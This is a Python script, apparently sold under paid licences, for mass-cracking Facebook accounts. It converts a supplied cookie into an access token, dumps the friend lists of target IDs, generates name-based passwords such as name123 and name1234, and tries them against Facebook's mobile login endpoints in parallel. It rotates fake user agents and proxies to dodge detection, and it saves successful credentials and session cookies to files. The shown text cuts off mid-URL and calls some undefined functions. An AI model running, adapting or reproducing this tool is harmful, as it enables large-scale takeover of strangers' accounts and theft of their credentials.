# 5-26-2023
import bs4,requests,os,json,time,sys,random,re,datetime,string,subprocess
import zlib,base64,pip,urllib,urllib3,rich
from rich.markdown import Markdown as mark
from bs4 import BeautifulSoup as sop
from rich import pretty
from rich.tree import Tree
from rich import print as tri
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich import print as cetak
from rich.panel import Panel
from rich.columns import Columns
from rich.console import Console as sol
from rich.console import Console as console
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	exit(e)


ugen=[]
ugen2=[]


CON=sol()
pretty.install()
ses=requests.Session()
ugen=[]
ugen2=[]
tokenku=[]
#2
id=[]
id2=[]
uid=[]
#3
anyr=[]
uadia, uadarimu = [],[]
pik=[]
met=[]
ua = []
UserAgent = []
#4
loop=0
ok=0
cp=0
pwl = []
#5
uakw = []
uakn = []
pwk = []

akun = []



def key():
    os.system("clear");logo();key = input(" masukan lisensi anda : ")
    try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=21384&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);print(f"{P}selamat lisensi kamu aktif ");login()
    except KeyError:
        print(f"{P}lisensi anda sudah kedaluwarsa silahkan beli lisensi ke admin");os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285726360406?text=assalamualaikum+bang+mau+beli+lisensi+crack+facebook");time.sleep(2);exit()


def cek():
    try:x=open("data/lisensi.txt","r").read()
    except FileNotFoundError:key()
    try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyI1NzM5MjA4MCIsIi9CNm5FSTF5elF0aGZidFFTQTF1WVBOSkVTQnZycFp0eGc1YlFONkwiXQ==&ProductId=21384&Key=%s"%(x)).json()['licenseKey']['key'];login()
    except KeyError:
        print(f"{P}lisensi anda sudah kedaluwarsa silahkan beli lisensi ke admin");os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285726360406?text=assalamualaikum+bang+mau+beli+lisensi+crack+facebook");time.sleep(2);exit()


def key():
    os.system("clear") 
    logo()
    print(f"{P}silahkan ketik {H}beli untuk melihat harga lisensi script")
    key = input(f"{P} masukan lisensi :{H} ")
    if key in ["beli","Beli","BELI"]:beli_bang()
    try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyI1NzM5MjA4MCIsIi9CNm5FSTF5elF0aGZidFFTQTF1WVBOSkVTQnZycFp0eGc1YlFONkwiXQ==&ProductId=21384&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);print(f"{P}selamat lisensi lu aktif ");time.sleep(4);login()
    except KeyError:
        print(f"{P} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu");os.system("xdg-open https://wa.me/+6285726360406?text=assalamualaikum+bang+mau+beli+lisensi+crack+facebook");time.sleep(2);exit()


def cek():
    try:x=open("data/lisensi.txt","r").read()
    except FileNotFoundError:key()
    try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyI1NzM5MjA4MCIsIi9CNm5FSTF5elF0aGZidFFTQTF1WVBOSkVTQnZycFp0eGc1YlFONkwiXQ==&ProductId=21384&Key=%s"%(x)).json()['licenseKey']['key'];login()
    except KeyError:
        print(f"{P}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin");os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6285726360406?text=assalamualaikum+bang+mau+beli+lisensi+crack+facebook");time.sleep(2);exit()


def buy_lisenn():
    try:xz = open("data/lisensi.txt","r").read()
    except FileNotFoundError:key()
    os.system("clear");cek()


def beli_bang():
    cetak(Panel("1. lisensi 2 minggu 30k\n2. lisensi 1 bulan 60k\n3. lisensi 2 bulan 75k\n4. 1 tahun 100k\n5. permanen 130k\n6. open source 150k\n7. exit",style=f"bold white"))
    zxc = input(" pilih lisensi : ")
    if zxc in [""]:print(f"{P}pilih yang bener ");time.sleep(3);buy_lisenn()
    elif zxc in ["1","01"]:os.system("xdg-open https://wa.me/+6285726360406?text=assalamualaikum+bang+mau+beli+lisensi+2+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+2+bulan");time.sleep(2);exit()
    elif zxc in ["4","04"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+1+tahun");time.sleep(2);exit()
    elif zxc in ["5","05"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+permanen");time.sleep(2);exit()
    elif zxc in ["6","06"]:os.system("xdg-open https://wa.me/+6285888222944?text=assalamualaikum+bang+mau+beli+lisensi+open+source");time.sleep(2);exit()
    elif zxc in ["7","07"]:time.sleep(2);exit()
    else:print(f"{P}ketik apaa ? ");time.sleep(3);buy_lisenn()


def cek_lisensi_aktif():
	try:xz = open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	os.system("clear");cek()



bt = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = bt[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okx = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpx = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'


def logo():
	print(f"""\t 

┏━┓┏━┓╋╋╋╋┏┓
┃┃┗┛┃┃╋╋╋╋┃┃
┃┏┓┏┓┣━━┳━┫┃┏┓
┃┃┃┃┃┃┏┓┃┏┫┗╋┻━┓
┃┃┃┃┃┃┏┓┃┃┃┏╋┳━┛
┗┛┗┛┗┻┛┗┻┛┗┛┗┛
""")


BP = '\x1b[1;105m'
P = '\x1b[1;97m'
K = '\033[93m'
H = '\x1b[1;92m'
HI = '\033[32m'
KU = '\033[33m'
M = '\033[1;31m'
xx = '\33[m'
G = '\033[35m'



def back():
	login()


for xd in range(10000):
	aa='Mozilla/5.0 (Windows NT 10.0;'
	c='Win64; x64)'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/'
	h=random.randrange(73,110)
	i='8'
	j=random.randrange(1200,1900)
	k=random.randrange(40,130)
	l='Agency/98.8.9147.48'
	uaku2=f'{aa} {c} {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uaku2)

for majujaya in range(10000):
	rr = random.randint
	rc = random.choice
	vs1 = random.choice(['4.2.2','5.1','6.0','7.0','7.1.2','8.1.0','4','5','6','7','8','9','10','11','12','13'])
	ua1 = f"Mozilla/5.0 (Linux; Android {str(rr(5,13))}; SM-F721W Build/TP1A.{str(rr(111111,210000))}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5200,5999))}.{str(rr(75,160))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]"
	ua2 = f"Mozilla/5.0 (Linux; Tizen {vs1}; SAMSUNG Family Hub 8.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,110))}.0.{str(rr(5200,5900))}.{str(rr(1,10))} Mobile Safari/537.36"
	ua3 = f"Mozilla/5.0 (Linux; U; Android {vs1}; my-zg; OPPO F1s Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,100))}.0.{str(rr(2500,3500))}.{str(rr(70,150))} Mobile Safari/537.36 OppoBrowser/15.5.0.9"
	ua4 = f"Mozilla/5.0 (Linux; Android {vs1}; Air1 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(4200,4999))}.{str(rr(75,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]"
	ua5 = f"Mozilla/5.0 (Linux; Android {vs1}; SAMSUNG SM-N960N) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/12.1 Chrome/{str(rr(73,150))}.0.{str(rr(3200,3999))}.{str(rr(75,150))} Mobile Safari/537.36"
	ua6 = f"Mozilla/5.0 (Linux; U; Android {vs1}; id-id; Redmi Note 10S Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.13.2-gn"
	ua7 = f"Mozilla/5.0 (Linux; Android {vs1}; SO-05K Build/52.1.B.0.266; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,140))}.0.{str(rr(5400,5900))}.{str(rr(40,150))} Mobile Safari/537.36 YJApp-ANDROID jp.co.yahoo.android.ybrowser/3.38.0.5"
	ua8 = f"Mozilla/5.0 (Linux; Android {vs1}; en-nz; SAMSUNG EK-GN120 Build/JDQ39) AppleWebKit/535.19 (KHTML, like Gecko) Version/1.0 Chrome/{str(rr(10,20))}.0.{str(rr(1000,1500))}.{str(rr(200,500))} Mobile Safari/535.19"
	ua9 = f"Mozilla/5.0 (Linux; Android {vs1}; Primo NH3 Lite Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(3100,3900))}.{str(rr(40,130))} Mobile Safari/537.36"
	ua10 = f"Mozilla/5.0 (Linux; Android {vs1}; OPPO CPH1803 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4100,4900))}.{str(rr(40,150))} Mobile Safari/537.36 AlohaBrowser/2.22.0"
	UaGas= random.choice([ua1, ua2, ua3, ua4, ua5, ua6, ua7, ua8, ua9, ua10])
	ugen.append(UaGas)
	


def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cook.txt','r').read()
		tokenku.append(token)
		try:
			ho = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			to = json.loads(ho.text)['name']
			ko = json.loads(ho.text)['id']
			masuk(to,ko)
		except KeyError:
			login_jon()
		except requests.exceptions.ConnectionError:
			print(f'{P} internet bermasalah ')
			exit()
	except IOError:
		login_jon()


def login_jon():
	try:
		os.system('clear')
		logo()
		your_cookies = input(f'{P}—> Input Cookie : {G}')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f"{P}—>  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n{P}—> Token : \x1b[1;92m{access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cook.txt","w").write(your_cookies)
							print(f"\n ✓ {P}Login Berhasil Jalankan Lagi, python gas.py ");exit()
			except Exception as e:
				print(f'\n{P}|—× Cookie Mokad')
				os.system('rm -rf .token.txt && rm -rf .cook.txt')
				print(e)
				time.sleep(2)
				back()
	except:pass


def masuk(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cook.txt','r').read()
	except IOError:
		print(f'{P} Cookie Kadaluarsa ')
		time.sleep(3)
		login_jon()
	os.system('clear')
	time.sleep(4)
	print(f"""\t 
  ┏━┓┏━┓╋╋╋╋┏┓
  ┃┃┗┛┃┃╋╋╋╋┃┃
  ┃┏┓┏┓┣━━┳━┫┃┏┓
  ┃┃┃┃┃┃┏┓┃┏┫┗╋┻━┓
  ┃┃┃┃┃┃┏┓┃┃┃┏╋┳━┛
  ┗┛┗┛┗┻┛┗┻┛┗┛┗┛
  nama facebook : {my_name}
  id facebook : {my_id}
""")
	print('')
	print(f'{P}(1) crack publik ✓ ')
	print(f'{P}(2) crack masal ✓ ')
	print(f'{P}(3) exit ✓ ')
	ges=input(f'{P}[$] pilih : ')
	if ges in ['1']:
		publikk()
	elif ges in ['2','02']:
		massall()
	elif ges in ['3']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cook.txt')
		print(' exit ✓ ')
		exit()
	else:
		print(' pilih yang benar x ')
		exit()



def bukan():
	os.system('clear')
	print('')
	print(f""" {G}({P}01{G}) {P}Masukan Lesensi
 {G}({P}02{G}) {P}Beli Lesensi
 {G}({P}03{G}) {P}exit """)
	print('')
	inpo = input(f'{P} └─ pilih : {G}')
	if inpo in ['1','01']:
		bolt()
	elif inpo in ['2','02']:
		os.system('xdg-open https://wa.me/+6285726360406?text=assalamualaikum+bang+mau+beli+lisensi+dong');exit()
	elif inpo in ['3','03']:
		print(f' {xx}[!] exit ');exit()
	else:
		print(f' {xx}pilih yang benar ');exit()
	
def bolt():
		os.system('clear')
		print('')
		beot = input(f' {P}Lesensi : {G}')
		if beot =="":
			print(f' {xx}masukan dengan benar ');exit()
			os.system('clear')
		time.sleep(3)
		print(f'\n {xx}sedang mengecek\n')
		time.sleep(4)
		if beot not in ('rongmngg','seulnnn','seaunnnng',"slmaaanyw"):
			print(f' {xx}Lesensi salah ');exit()
			os.system('clear')
		else:
			print(f' {xx}selamat lesensi betul ')



def publikk():
	try:
		cok = open('.cook.txt','r').read()
	except IOError:
		os.system('rm -rf .token.txt && rm -rf .cook.txt')
		print(f'{P} Cookie Kadaluarsa')
		exit()
	idny = input(f'{P}[$] Input ID : ')
	try:
		meid = requests.get('https://graph.facebook.com/v1.0/'+idny+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for balsem in meid['friends']['data']:
			try:id.append(balsem['id']+'|'+balsem['name'])
			except:continue
		print(f'{P}[$] Total ID : '+str(len(id)))
		aturt()
	except requests.exceptions.ConnectionError:
		print(f' {P}cek, internet anda bermasalah')
		exit()
	except (KeyError,IOError):
		print(f' {P}ID Tidak Publik ')
		time.sleep(3)
		publikk()



def massall():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cook.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{P}[$] ingin berapa id ? '))
	except ValueError:
		print(' yang bener ')
		exit()
	if jum<1 or jum>100:
		print(f'{P} gagal dump id ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('[$] masukan id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' internet bermasalah ')
			exit()
	try:
		print('[$] total '+str(len(id)))
		aturt()
	except requests.exceptions.ConnectionError:
		print(f'{P}')
		print(' internet bermasalah ')
		back()
	except (KeyError,IOError):
		print(' teman tidak publik ')
		time.sleep(3)
		back()



def aturt():
	print('')
	print(f'{P}(1) id lama')
	print(f'{P}(2) id baru')
	print(f'{P}(3) id random')
	tyt = input(f'{P}[$] pilih : ')
	if tyt in ['1']:
		for alma in sorted(id):
			id2.append(alma)
	elif tyt in ['2']:
		for anyar in sorted(id):
			anyr.append(anyar)
		anr=len(anyr)
		any=(anr-1)
		for apj in range(anr):
			id2.append(anyr[any])
			any -=1
	elif tyt in ['3']:
		for cak in id:
			pik = random.randint(0,len(id2))
			id2.insert(pik,cak)
	else:
		print(f'{P} pilih yang benar x ')
		exit()
	
	
	print('')
	print('(1) beta.facebook.com (2) mbasic.facebook.com\n─────────────────────────────────────────────\n(3) m.facebook.com (4) free.facebook.com (5) new.header ')
	bel = input(f'{P}[$] pilih : ')
	if bel in ['1']:
		met.append('beta1')
	elif bel in ['2']:
		met.append('mbasic2')
	elif bel in ['3']:
		met.append('m.facebok3')
	elif bel in ['4']:
		met.append('free.facebok4')
	elif bel in ['5']:
		met.append('headnew5')
	else:
		print(' pilih yang bener x ');exit()
	pasw()

pwpluss=[]
pwnya=[]


def pasw():
	global prog,des
	print('')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as sik:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'321')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
				if 'yy' in pwk:
					for xpk in pwi:
						pwv.append(xpk)
				else:pass
				if 'beta1' in met:
					sik.submit(crackbe,idf,pwv)
				elif 'mbasic2' in met:
					sik.submit(crackmb,idf,pwv)
				elif 'm.facebok3' in met:
					sik.submit(crackmf,idf,pwv)
				elif 'free.facebok4' in met:
					sik.submit(crackfr,idf,pwv)
				elif 'headnew5' in met:
					sik.submit(crackhed,idf,pwv)
				else:
					sik.submit(crackbe,idf,pwv)
	print('')
	print(f'{P}[$] total ok %s '%(ok))
	print(f'{P}[$] total cp %s '%(cp))
	print('')
	time.sleep(3)
	exit()



def crackbe(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{P} {loop}/{len(id)} [bold green]{ok}[/]-[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.beta.facebook.com/?locale=id_ID&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.beta.facebook.com/login/save-device/?login_source=login","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}")
				tree.add(f"[bold yellow]{pw}").add(f"[bold yellow]{ua}{P}")
				tri(tree)
				open('CP/'+cpx,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f" ")
				tree.add(f"[bold green]{idf}")
				tree.add(f"[bold green]{pw}")
				tree.add(f"[bold green]{kuki}").add(f"[green]{ua}{P}")
				tri(tree)
				open('OK/'+okx,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def crackhed(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{P} {loop}/{len(id)} [bold green]{ok}[/]-[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D209104039103989%26scope%3Demail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fasia-identity.oriflame.com%252Fsignin-facebook%26state%3DCfDJ8LvpYsQMXrtMh3GSiSxS193LRnY1qX_Oua8sXfjpqEeUXIdSdb5drE6jHgpjdD-gpqBl_uZmCtMlZe1p7xqrjZ7R0Eini0h01r3FiqJlAOf9GbWkP-ZAoCPzzmg7cBA2DNmjDAE9DonOueviwbbetQvCdI0TrgjgK4QIZkYfD4nNG3E4k6PcEveh-Nz6iVTgsvnohkzBJj9lJEjvw_d2_l3pOh0pmnTiG4wWtL3iDmb2HAO3liAefemcJynqN7bbmo04MOpljArC8YamWCPCnOraxpmc5EV0tt5DcZkPQgZ8ZYt_ErAze6y-dXtXBJAf7vxOpTZN2jWUKOZEn84OsVD7TtwY8XQCYXjar1s2pfsc5Z-Tp2p_zb06CX_o5UqzcESa6UiyuErGvUNA6zv0uJQbFfHfxfcKou3fFaw6pn2ohtoQK5Nlz-86z-7evzUmjfTp0v9Irl6gf1WaSVZ7C5RlzXPEhAuzzQukUC7Xk7DjjlG9pSln1efpYzY7R82tSDQh0lDpaHFIviAubLokK1q866Jsm2NP0r3jLV-eHeZk4FkMtvPR5gbN9gDYI52G0BSNCuk2ioYXVw2iFPh9_kxjbUrllZj5MIBTVfaifUs3jhFSzHLCcxlDCtC9IunXK7HZ5BsU0rj9re8GQCiiNklCDJBlaYTdosPpLnJYRMkMgdZf9YrX3HweidJqAuDQUATQ8Oc1f9FSTTXgYv-L2XMDz5yqrB4ZYWBBcr-jj5TCDDN_LdSA_XiFC-UBCs9AKROvMKp6ZsaG-Sp8avt2uhrVBHtGarzNEqovDlMSdP-SkqM4gbImArATmLJfE6W4I9J6yDWERBzjDi4gh3eTPuHxDPw1Fq2idAL0mSei0xcRUO2wNRDEOE1MgHTqqrOHRfCPrX6Kv9u6o1LWp0C_NWteEzpP6NTZmBnKO_c2SC7DIdWLYxNK70oBGRIQtJsXrqyvKgHCmJGTV-fenK1iTnCSeRA6NSNwGHeZyDvSpqfV4rCdz7_BP7_05Gp12N96mna3-Ii53_1MSoHjwrN2AGOvcMC_Wd0RKS93ajLkpumX47ghw78x6o0RyWkpjCWAVw6IYBtwPZiFmRMDrVALioUseiVK8B42cJ8RV_26hO7xPdf-2DY1RbyGtPW-S2LTiRRe5KT3mgep7_fbhDSDKT0kx70C_Wa_xlfuJPMr6a03C6-U_RIEr4t6qov9BJ2dNDOJmPlVgilc3EOPAFwWjV9Y01XSs6csSUHmXMfU1L0kVs4ahi3fX7lMV7Q-jrxU-VLdNXg7atC1IWy5-p-SOMgExweS3sIEoVYi_3Yqt8Kn6qgYTAQWNbxVJeAANb_rDf7N851mRfc_A4JC-zUXL4l9gbVS6_pfS6atQIdJgtAJlEuqlZDB3uDoQyee4yljHBN2XJCOQsN6l1gfvjqaSLlzPwHvWsMayMkXkFpEh8MqAK2Ahj_XfYtiSwc0mhWHZcDFdGBd46uq4SSJbhDXWSt20ZHUS9ME2lpQGk7kP7xvvyRYI0Vc7OQUnWQD9d6GXw8pjbgxfn2tu1q-VJzL_UK70T92sBM0pgp4qoxnm4x6rITxGThpISTvIqhsHiVaiSOj9lGVG0ZrJpbm-ZtcMzrNeTS1oVyhIp0jCkbCo19lS0LViHJrnOxSFwS6n4fgIirv0cLLJ6dtPJ7K1GxurWTMe0otxjIucBjRTEEmc80CBhuwRNNPmE4nJ-fZkoVKZJRvOu5UJ-ktn5GCXRZo4JQzXOck_gOrEqUcEaLImUCPgmWiIYLr6RUSx8zCGyoLZbzkYg315HnMLo5l552xFqQ48qayy531Lkm94BQOKNLAFXbqEavFgsoJWhDFPKPRZMROgnMl-bdamTL2rSOEHE0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db1f44a2c-9d4b-43ed-a467-d0c10dc970f5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fasia-identity.oriflame.com%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3